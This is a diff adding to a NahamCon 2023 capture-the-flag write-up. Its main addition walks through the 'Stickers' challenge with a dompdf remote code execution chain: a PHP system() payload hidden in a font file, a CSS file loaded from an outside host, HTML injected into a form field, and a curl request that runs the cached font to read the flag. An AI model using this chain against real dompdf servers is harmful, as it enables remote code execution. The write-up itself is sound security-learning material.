@@ -490,10 +490,71 @@ Error: Please request a valid history index (1 to 6)
 User5: Aha! You're right, I was here before all of you! Here's your flag for finding me: flag{c398112ed498fa2cacc41433a3e3190b} 
 ```
 #### Stickers
-[TO DO]
+`Wooohoo!!! Stickers!!! Hackers love STICKERS!! You can make your own with our new website!`
 
+![](2023-06-18-21-15-11.png)
+
+Upon submitting the form, 
+![](2023-06-18-21-16-13.png)
+
+The URL is `http://challenge.nahamcon.com:30331/quote.php?organisation=My+Org+Name&email=email%40email.com&small=1&medium=2&large=4`. This tells us that the backend is in PHP and it inserts the organization name and email into the generated PDF. 
+
+
+Searched Google for PHP PDF exploits and one of the first hits was this writeup of the CVE by Snyk. The second link was a coded exploit on GitHub by Positive Security. 
+* https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/
+* https://github.com/positive-security/dompdf-rce/
+* https://positive.security/blog/dompdf-rce
+
+These sites have a very detailed writeup on the vulnerability. I will summarize the steps I used. 
+1. create a exploit font file by opening a font file and inserting a RCE code into it. 
+```php
+    <?php system("cat /flag.txt"); ?>
+```
+2. Create a exploit CSS that refers to the font file in an accessible location. Store the CSS in an accessible location as well.
+```css
+    @font-face {
+        font-family:'expfont';
+        src:url('https://raw.githubusercontent.com/meashiri/ctf-writeups/main/files/exploit_font.php');
+        font-weight:'normal';
+        font-style:'normal';
+    }
+```
+Note the name of the font you used. You will need it later. 
+3. Inject a reference to the CSS in the `organization name` field of the form on the challenge web server
+![](2023-06-18-21-31-14.png)
+
+4. Press submit and verify that the PDF was successfully generated. The URL would be similar to the following: 
+`http://challenge.nahamcon.com:30331/quote.php?organisation=%3Clink+rel%3Dstylesheet+href%3D%27https%3A%2F%2Fraw.githubusercontent.com%2Fmeashiri%2Fctf-writeups%2Fmain%2Ffiles%2Fexploit.css%27%3E&email=email%40email.com&small=1&medium=2&large=4`
+
+5. Now, the font is cached in the DomPDF folder on the server and can perform RCE if we invoke it directly. 
+
+6. The path of the cached file is `<webroot>/dompdf/lib/fonts/<font name>_normal_<md5 hash>.php`
+
+7. The md5 is the md5 of the URL of the font. It can be calculated as: 
+```bash
+    % echo -n "https://raw.githubusercontent.com/meashiri/ctf-writeups/main/files/exploit_font.php" | md5
+    f00d4e3ed0b0844e00eda7061397debb
+```
+8. Invoking the cached font on the web server will give us the font file with the results of the remote command. 
+```bash
+    % curl http://challenge.nahamcon.com:30331/dompdf/lib/fonts/expfont_normal_f00d4e3ed0b0844e00eda7061397debb.php -o -      
+
+    � dum1�cmap
+            `�,glyf5sc��head�Q6�6hhea��($hmtxD
+    loca
+    Tmaxp\ nameD�|8dum2�
+                        -��-����
+    :83#5:08��_<�
+                @�8�&۽
+    :8L��
+
+    :D
+
+    6				s
+    flag{a4d52beabcfdeb6ba79fc08709bb5508}
+```
+or from the browser:
 ![](2023-06-16-18-57-23.png)
-
 
 #### One-Zero
 
@@ -514,6 +575,10 @@ We get a [cool certificate](CertificateWBL.png) that shows that we were placed 6
 * https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf
 * https://crypto.stackexchange.com/questions/3978/understanding-the-length-extension-attack
 * https://cothan.blog/post/tamuctf2019-cr4ckz33c0d3-with-angr/
+* https://gist.github.com/mlashley/224a91cff0b1712e161121817b1e24b3
+* https://notateamserver.xyz/nahamcon-2023-crypto/ (matrix based solve for JOM)
+* https://github.com/daffainfo/ctf-writeup/tree/main/NahamCon%20CTF%202023
+
 
 ### List
 |Category|Challenge|Description
@@ -529,7 +594,7 @@ We get a [cool certificate](CertificateWBL.png) that shows that we were placed 6
 |Cryptography|ForgeMe 2| SHA1 length extension attack for HMAC forgery, unknown salt len
 |Cryptography|Just One More| Linear programming, solved with Z3
 |Cryptography|RSA Intro| 3 different RSA techniques
-|Cryptography|RSA Outro|
+|Cryptography|RSA Outro| unknown n, Z3 to determine q and p
 |Cryptography|Signed Jeopardy|
 |DevOps|Pirates|
 |DevOps|Supplier|
@@ -540,8 +605,8 @@ We get a [cool certificate](CertificateWBL.png) that shows that we were placed 6
 |Forensics|IR #3|
 |Forensics|IR #4|
 |Forensics|IR #5|
-|Forensics|Perfectly Disinfected|
-|Forensics|Raided|
+|Forensics|Perfectly Disinfected|flag in PDF title
+|Forensics|Raided|get SSH host, user and private key using strings
 |Miscellaneous|Flow|
 |Miscellaneous|Goose Chase|
 |Miscellaneous|One Zero Two|
@@ -574,7 +639,7 @@ We get a [cool certificate](CertificateWBL.png) that shows that we were placed 6
 |Warmups|Regina| REXX emulator
 |Warmups|Technical Support|
 |Warmups|tiny little fibers| JPEG forensics
-|Web|Hidden Figures|
+|Web|Hidden Figures|flag from images in B64 in HTML
 |Web|Marmalade 5|
 |Web|Museum|
 |Web|Obligatory|
